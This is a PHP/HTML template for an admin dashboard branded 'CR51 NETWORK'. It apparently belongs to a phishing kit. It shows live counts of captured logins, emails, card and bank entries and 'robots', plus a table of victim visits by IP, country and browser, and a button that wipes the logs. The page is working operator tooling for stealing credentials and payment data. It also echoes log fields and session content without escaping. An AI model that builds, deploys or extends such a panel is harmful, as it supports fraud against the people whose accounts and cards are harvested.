<!DOCTYPE html>
<html lang="zxx">

<head>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Admin - CR51 NETWORK</title>
    <link rel="icon" href="<?= base_url() ?>CR51/Assets/Panel/Assets/img/mini_logo.png" type="image/png">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css" rel="stylesheet">

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/css/bootstrap1.min.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/themefy_icon/themify-icons.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/niceselect/css/nice-select.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/owl_carousel/css/owl.carousel.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/gijgo/gijgo.min.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/font_awesome/css/all.min.css" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/tagsinput/tagsinput.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datepicker/date-picker.css" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/vectormap-home/vectormap-2.0.2.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/scroll/scrollable.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/css/jquery.dataTables.min.css" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/css/responsive.dataTables.min.css" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/css/buttons.dataTables.min.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/text_editor/summernote-bs4.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/morris/morris.css">

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/material_icon/material-icons.css" />

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/css/metisMenu.css">

    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/css/style1.css" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/Panel/Assets/css/colors/default.css" id="colorSkinCSS">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/dt-1.11.3/datatables.min.css" />
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/v/bs4/dt-1.11.3/datatables.min.js"></script>

</head>

<body class="crm_body_bg">

    <script type="text/javascript">
        setInterval(function() {
            fetch('<?= base_url() ?>panel/json')
                .then(r => r.json())
                .then(data => {
                    console.log(data)
                    let logaccount = data.logaccount
                    let logemail = data.logemail
                    let Secure = data.Secure
                    let logcard = data.logcard
                    let logbank = data.logbank
                    let logclick = data.logclick
                    let logrobot = data.logrobot

                    document.getElementById("logclick").innerHTML = logclick
                    document.getElementById("logcard").innerHTML = logcard
                    document.getElementById("logaccount").innerHTML = logaccount
                    document.getElementById("logemail").innerHTML = logemail
                    document.getElementById("logrobot").innerHTML = logrobot
                    document.getElementById("logbank").innerHTML = logbank
                });
        }, 1000);
    </script>
    <?php echo view('panel/menu'); ?>
    <section class="main_content dashboard_part large_header_bg">
        <?php echo view('panel/atas'); ?>
        <div class="main_content_iner overly_inner ">
            <div class="container-fluid p-0 ">

                <div class="row">
                    <div class="col-12">
                        <div class="page_title_box d-flex flex-wrap align-items-center justify-content-between">
                            <div class="page_title_left">
                                <h3 class="f_s_25 f_w_700 dark_text">Home</h3>
                                <ol class="breadcrumb page_bradcam mb-0">
                                    <li class="breadcrumb-item"><a href="javascript:void(0);">Home</a></li>
                                </ol>
                            </div>
                            <form role="form" action="<?= base_url() ?>panel/update" method="POST" class="form login">
                                <input type="password" name="resetlog" class="form-control" value="resetlog" hidden="">
                                <button class="btn btn-outline-danger rounded-pill mb-3" name="gasreset">Reset Log</button>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="row ">
                    <div class="col-xl-12">
                        <div class="white_card card_height_100 mb_30 ">
                            <div class="row">
                                <div class="col-lg-9">
                                    <div class="white_card_header">
                                        <div class="box_header m-0">
                                            <div class="main-title">
                                                <h3 class="m-0">Daftar Negara Pengunjung</h3>
                                                <span>Halaman Bagian Table tidak realtime, selain itu sudah realtime.</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="white_card_body QA_section">
                                        <div class="QA_table ">

                                            <div class="white_card_body">
                                                <div class="QA_section">
                                                    <div class="QA_table mb_30">
                                                        <?php

                                                        if (file_exists(FCPATH . "CR51/Static/log_click.txt")) {
                                                            $bit = file_get_contents(FCPATH . "CR51/Static/log_click.txt");
                                                            $bit = explode("\n", $bit);
                                                            $list = array_reverse($bit);
                                                        ?>
                                                            <table class="table lms_table_active ">
                                                                <thead>
                                                                    <tr>
                                                                        <th scope="col">Ip</th>
                                                                        <th scope="col">Country</th>
                                                                        <th scope="col">Browser</th>
                                                                        <th scope="col">Keterangan</th>
                                                                        <th scope="col">Jam</th>
                                                                    </tr>
                                                                </thead>
                                                                <tbody>
                                                                    <?php
                                                                    foreach ($list as $cr51) {
                                                                        $cr51 = explode("|", $cr51);
                                                                        $time = $cr51[1];
                                                                        $ip = $cr51[2];
                                                                        $countryname = $cr51[3];
                                                                        $bowser = $cr51[4];
                                                                        $keterangan = $cr51[5];
                                                                        if ($ip == "") {
                                                                        } else {
                                                                    ?>
                                                                            <tr>
                                                                                <td><?= $ip ?></td>
                                                                                <td><?= $countryname ?></td>
                                                                                <td><?= $bowser ?></td>
                                                                                <td><?= $keterangan ?></td>
                                                                                <td><?= $time ?></td>
                                                                            </tr>
                                                                <?php
                                                                        }
                                                                    }
                                                                } ?>
                                                                </tbody>

                                                            </table>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-3 white_card_body pt_25">
                                    <div class="white_card card_height_100 mb_30 social_media_card">
                                        <div class="white_card_header">
                                            <div class="main-title">
                                                <h3 class="m-0">Jumlah Keseluruhan Pengunjung</h3>
                                                <span>Good Luck Bro!!</span>
                                                <div class="media_card_body">
                                                    <div class="media_card_list">
                                                        <div class="single_media_card">
                                                            <span>Visitor</span>
                                                            <h3 id="logclick"></h3>
                                                        </div>
                                                        <div class="single_media_card">
                                                            <span>Card</span>
                                                            <h3 id="logcard"></h3>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="media_thumb ml_25">
                                            <img src="<?= base_url() ?>CR51/Assets/Panel/Assets/img/media.svg" alt="">
                                        </div>
                                        <div class="media_card_body">
                                            <div class="media_card_list">
                                                <div class="single_media_card">
                                                    <span>Login</span>
                                                    <h3 id="logaccount"></h3>
                                                </div>
                                                <div class="single_media_card">
                                                    <span>Email</span>
                                                    <h3 id="logemail"></h3>
                                                </div>
                                                <div class="single_media_card">
                                                    <span>Robots</span>
                                                    <h3 id="logrobot"></h3>
                                                </div>
                                                <div class="single_media_card">
                                                    <span>Bank</span>
                                                    <h3 id="logbank"></h3>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>

        <?php echo view('panel/bawah'); ?>
    </section>

    <div id="back-top" style="display: none;">
        <a title="Go to Top" href="#">
            <i class="ti-angle-up"></i>
        </a>
    </div>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/jquery1-3.4.1.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/popper1.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/bootstrap1.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/metisMenu.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/count_up/jquery.waypoints.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chartlist/Chart.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/count_up/jquery.counterup.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/niceselect/js/jquery.nice-select.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/owl_carousel/js/owl.carousel.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/jquery.dataTables.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/dataTables.responsive.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/dataTables.buttons.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/buttons.flash.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/jszip.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/pdfmake.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/vfs_fonts.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/buttons.html5.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datatable/js/buttons.print.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datepicker/datepicker.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datepicker/datepicker.en.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/datepicker/datepicker.custom.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/chart.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chartjs/roundedBar.min.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/progressbar/jquery.barfiller.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/tagsinput/tagsinput.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/text_editor/summernote-bs4.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/am_chart/amcharts.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/scroll/perfect-scrollbar.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/scroll/scrollable-custom.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/vectormap-home/vectormap-2.0.2.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/vectormap-home/vectormap-world-mill-en.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/apex_chart/apex-chart2.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/apex_chart/apex_dashboard.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/echart/echarts.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chart_am/core.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chart_am/charts.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chart_am/animated.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chart_am/kelly.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/vendors/chart_am/chart-custom.js"></script>

    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/dashboard_init.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/Panel/Assets/js/custom.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
    <?php if (@$_SESSION['sukses']) { ?>
        <script>
            <?php echo $_SESSION['sukses']; ?>
        </script>
    <?php unset($_SESSION['sukses']);
    } ?>
</body>

</html>